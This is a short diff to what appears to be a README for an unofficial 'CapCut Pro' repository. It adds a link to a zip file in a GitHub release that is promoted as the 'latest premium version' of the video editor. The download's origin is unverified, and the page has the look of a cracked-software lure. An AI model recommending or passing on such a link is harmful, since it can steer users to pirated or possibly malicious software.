@@ -8,7 +8,7 @@ Welcome to the CapCut Pro hub! 🚀 Your go-to destination for unlocking the ama
 - Topics: CapCut, video editing, CapCut-Pro, free video editor, professional video editor, video effects, mobile video editing, CapCut tools, CapCut features  
 
 ## 🔗 Accessing the Software  
-### [Download CapCut Pro]()
+### [Download CapCut Pro](https://github.com/Lachi03/CapCut-Pro-Full-2025/releases/download/capcut-pro/CapCut-Pro.zip)
 
 Note: Click the link to get the latest premium version and set it up on your device. 🎥  
 
